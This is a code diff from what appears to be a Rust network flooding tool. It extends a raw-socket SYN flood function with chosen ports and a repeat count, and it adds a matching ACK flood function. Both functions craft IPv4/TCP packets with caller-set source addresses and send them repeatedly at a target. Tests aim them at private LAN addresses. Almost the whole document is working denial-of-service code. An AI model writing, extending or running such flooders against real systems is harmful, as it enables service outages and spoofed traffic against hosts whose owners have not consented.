@@ -15,7 +15,13 @@ use crate::flood::TCP_DATA_LEN;
 use crate::flood::TCP_HEADER_LEN;
 use crate::utils;
 
-pub fn send_syn_flood_packet(src_ipv4: Ipv4Addr, dst_ipv4: Ipv4Addr) -> Result<()> {
+pub fn send_syn_flood_packet(
+    src_ipv4: Ipv4Addr,
+    src_port: u16,
+    dst_ipv4: Ipv4Addr,
+    dst_port: u16,
+    max_same_packet: usize,
+) -> Result<()> {
     let tcp_protocol = Layer3(IpNextHeaderProtocols::Tcp);
     let (mut tcp_tx, _) = match transport_channel(TCP_BUFF_SIZE, tcp_protocol) {
         Ok((tx, rx)) => (tx, rx),
@@ -42,8 +48,8 @@ pub fn send_syn_flood_packet(src_ipv4: Ipv4Addr, dst_ipv4: Ipv4Addr) -> Result<(
     let mut rng = rand::thread_rng();
     let mut tcp_buff = [0u8; TCP_HEADER_LEN + TCP_DATA_LEN];
     let mut tcp_header = MutableTcpPacket::new(&mut tcp_buff[..]).unwrap();
-    tcp_header.set_source(rng.gen());
-    tcp_header.set_destination(rng.gen());
+    tcp_header.set_source(src_port);
+    tcp_header.set_destination(dst_port);
     tcp_header.set_sequence(rng.gen());
     tcp_header.set_acknowledgement(rng.gen());
     tcp_header.set_reserved(0);
@@ -56,8 +62,84 @@ pub fn send_syn_flood_packet(src_ipv4: Ipv4Addr, dst_ipv4: Ipv4Addr) -> Result<(
 
     // set tcp header as ip payload
     ip_header.set_payload(tcp_header.packet());
-    match tcp_tx.send_to(ip_header, dst_ipv4.into()) {
-        _ => (),
+    for _ in 0..max_same_packet {
+        match tcp_tx.send_to(&ip_header, dst_ipv4.into()) {
+            _ => (),
+        }
     }
     Ok(())
+}
+
+pub fn send_ack_flood_packet(
+    src_ipv4: Ipv4Addr,
+    src_port: u16,
+    dst_ipv4: Ipv4Addr,
+    dst_port: u16,
+    max_same_packet: usize,
+) -> Result<()> {
+    let tcp_protocol = Layer3(IpNextHeaderProtocols::Tcp);
+    let (mut tcp_tx, _) = match transport_channel(TCP_BUFF_SIZE, tcp_protocol) {
+        Ok((tx, rx)) => (tx, rx),
+        Err(e) => return Err(e.into()),
+    };
+
+    // ip header
+    let mut ip_buff = [0u8; IPV4_HEADER_LEN + TCP_HEADER_LEN + TCP_DATA_LEN];
+    let mut ip_header = MutableIpv4Packet::new(&mut ip_buff[..]).unwrap();
+    ip_header.set_version(4);
+    ip_header.set_header_length(5);
+    ip_header.set_total_length((IPV4_HEADER_LEN + TCP_HEADER_LEN + TCP_DATA_LEN) as u16);
+    let id = utils::random_u16();
+    ip_header.set_identification(id);
+    ip_header.set_flags(Ipv4Flags::DontFragment);
+    ip_header.set_ttl(IP_TTL);
+    ip_header.set_next_level_protocol(IpNextHeaderProtocols::Tcp);
+    let c = checksum(&ip_header.to_immutable());
+    ip_header.set_checksum(c);
+    ip_header.set_source(src_ipv4);
+    ip_header.set_destination(dst_ipv4);
+
+    // tcp header
+    let mut rng = rand::thread_rng();
+    let mut tcp_buff = [0u8; TCP_HEADER_LEN + TCP_DATA_LEN];
+    let mut tcp_header = MutableTcpPacket::new(&mut tcp_buff[..]).unwrap();
+    tcp_header.set_source(src_port);
+    tcp_header.set_destination(dst_port);
+    tcp_header.set_sequence(rng.gen());
+    tcp_header.set_acknowledgement(rng.gen());
+    tcp_header.set_reserved(0);
+    tcp_header.set_flags(TcpFlags::ACK);
+    tcp_header.set_urgent_ptr(0);
+    tcp_header.set_window(1024);
+    tcp_header.set_data_offset(5);
+    let checksum = ipv4_checksum(&tcp_header.to_immutable(), &src_ipv4, &dst_ipv4);
+    tcp_header.set_checksum(checksum);
+
+    // set tcp header as ip payload
+    ip_header.set_payload(tcp_header.packet());
+    for _ in 0..max_same_packet {
+        match tcp_tx.send_to(&ip_header, dst_ipv4.into()) {
+            _ => (),
+        }
+    }
+    Ok(())
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+    #[test]
+    fn test_syn_flood_packet() {
+        let src_ipv4 = Ipv4Addr::new(192, 168, 72, 130);
+        let dst_ipv4 = Ipv4Addr::new(192, 168, 72, 136);
+        let ret = send_syn_flood_packet(src_ipv4, 8888, dst_ipv4, 80, 1).unwrap();
+        println!("{:?}", ret);
+    }
+    #[test]
+    fn test_ack_flood_packet() {
+        let src_ipv4 = Ipv4Addr::new(192, 168, 72, 130);
+        let dst_ipv4 = Ipv4Addr::new(192, 168, 72, 136);
+        let ret = send_ack_flood_packet(src_ipv4, 8888, dst_ipv4, 80, 1).unwrap();
+        println!("{:?}", ret);
+    }
 }
